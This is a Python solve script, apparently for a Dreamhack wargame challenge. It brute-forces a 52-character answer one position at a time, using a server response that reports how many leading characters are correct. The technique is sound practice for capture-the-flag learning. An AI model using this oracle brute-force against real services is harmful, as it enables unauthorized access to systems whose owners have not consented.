import requests, string

url = 'http://host3.dreamhack.games:21635/'

# answer = ''

# while True:
#   answer += 'a'
#   response = requests.get(url, params= {'answer': answer})
#   if 'correct' in response.text:
#     print(f'정답: {len(answer)}')
#     break
#   if len(answer)%30 == 0 :
#     print(f'현재 {len(answer)}\n')

length = 52

# 혹시 모를 언더바나 하이픈 추가
chars = string.ascii_letters + string.digits + "_-"

# 🚀 스피드업 핵심: Session 객체 사용
session = requests.Session()

# 🐛 버그 수정: 정답에 절대 안 들어갈 것 같은 '*' 문자로 패딩!
payload_list = list('*' * length)
answer = ''

for i in range(length):
    found = False
    for c in chars:
        payload_list[i] = c
        payload = ''.join(payload_list)
        
        # Session을 통해 초고속으로 요청 쏘기
        response = session.get(url, params={'answer': payload})
        
        if f'{i+1} correct' in response.text:
            answer += c
            print(f"[{i+1}/{length}] 찾음: {answer}")
            found = True
            break
            
    if not found:
        print(f"\n🚨 멈춤! {i+1}번째 글자를 못 찾았습니다. (chars에 없는 특수문자나 공백이 있나 봐요!)")
        break

print(f'\n🎉 브루트포스 종료! 최종 정답: {answer}')